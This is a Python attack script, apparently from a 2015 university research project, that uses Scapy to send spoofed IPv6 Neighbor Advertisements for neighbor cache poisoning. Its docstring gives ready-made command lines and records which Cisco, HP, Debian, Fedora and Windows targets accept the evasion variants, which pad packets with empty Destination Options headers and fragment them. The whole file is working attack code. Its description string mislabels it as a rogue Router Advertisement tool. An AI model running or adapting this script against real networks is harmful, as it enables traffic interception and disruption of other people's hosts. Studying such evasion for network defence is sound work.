#!/usr/bin/env python

# ncp.py: Neighbor cache poisoning attack script
#
# Copyright (c) 2015 Brno University of Technology
#
# Author(s): Jozef Pivarník <xpivar00@stud.fit.vutbr.cz>
#


"""
Basic attack example: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38

Extension headers: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 178
  Cisco: passes from 7 to 14 (including) empty DestOpt headers with lladdr option, 7 to 15 without lladdr option
  HP: passes 3 and more
    Example: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -S 2001:db8::226:9eff:fe8a:a538 -D fe80::200:ff:fe00:b0b -n 2001:db8::1 0 1 1 -a 00:26:9e:8a:a5:38 -e 3
  Debian: as many as will fit into MTU (178 empty DestOpt hdrs) in case of unicast (as MAC address also ff:ff:ff:ff:ff:ff or 33:33:00:00:00:01 may be used)
  Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
  Windows: as many as will fit into MTU (178 empty DestOpt hdrs) in case of unicast (as MAC address also ff:ff:ff:ff:ff:ff or 33:33:00:00:00:01 may be used)

Fragmentation: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 2 -f 80
  Cisco: passes
  HP: passes
  Debian: OK
  Fedora: OK
  Windows: OK

Fragmentation + extension headers: ./ncp.py -i p5p1 -d 00:00:00:00:0b:0b -D fe80::200:ff:fe00:b0b -n fe80::32e4:dbff:fe17:efa0 0 1 1 -a 00:26:9e:8a:a5:38 -e 178 -f 100
  Cisco: passes
  HP: passes
  Debian: as many fragments as needed with as many DestOpt hdrs as needed, but broadcast or multicast L2 address may not be used
  Fedora: does not allow ext headers except for frag (nor unicasted or multicasted)
  Windows: as many fragments as needed with as many DestOpt hdrs as needed
"""

from scapy.all import Ether, IPv6, IPv6ExtHdrFragment, IPv6ExtHdrDestOpt, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, fragment6, sendp
import argparse
import netifaces as ni
import sys

parser = argparse.ArgumentParser(description='Send crafted Rogue Router Advertisement.')
parser.add_argument('-i', '--interface', help='target interface', required=True)
parser.add_argument('-s', '--srcmac', help='source MAC address')
parser.add_argument('-d', '--dstmac', help='destination MAC address', required=True)
parser.add_argument('-S', '--srcip', help='source IP address')
parser.add_argument('-D', '--dstip', help='destination IP address', required=True)
parser.add_argument('-n', '--na', help='Neighbor Advertisement', required=True, nargs=4, metavar=('TARGET', 'R-FLAG', 'S-FLAG', 'O-FLAG'))
parser.add_argument('-e', '--exthdrs', help='number of empty Destination Options extension headers', type=int)
parser.add_argument('-f', '--frag', help='size of max MTU when using fragmentation', type=int)
parser.add_argument('-a', '--lladdr', help='source link-layer address option')
args = parser.parse_args()

try:
    if not args.srcmac:
        args.srcmac = ni.ifaddresses(args.interface)[ni.AF_LINK][0]['addr']

    if not args.srcip:
        for addr in ni.ifaddresses(args.interface)[ni.AF_INET6]:
            if addr['addr'].lower().startswith('fe80'):
                args.srcip = addr['addr'][:-(len(args.interface) + 1)]  # Remove %interface from link-local address

    p = Ether(src=args.srcmac, dst=args.dstmac)/IPv6(src=args.srcip, dst=args.dstip, hlim=255)

    if args.frag:
        p /= IPv6ExtHdrFragment()

    if args.exthdrs:
        for i in range(args.exthdrs):
            p /= IPv6ExtHdrDestOpt()

    p /= ICMPv6ND_NA(tgt=args.na[0], R=int(args.na[1]), S=int(args.na[2]), O=int(args.na[3]))

    if args.lladdr:
        p /= ICMPv6NDOptDstLLAddr(lladdr=args.lladdr)

    if args.frag:
        sendp(fragment6(p, args.frag), iface=args.interface)
    else:
        sendp(p, iface=args.interface)
except:
    sys.stderr.write('Unable to send a packet\n')
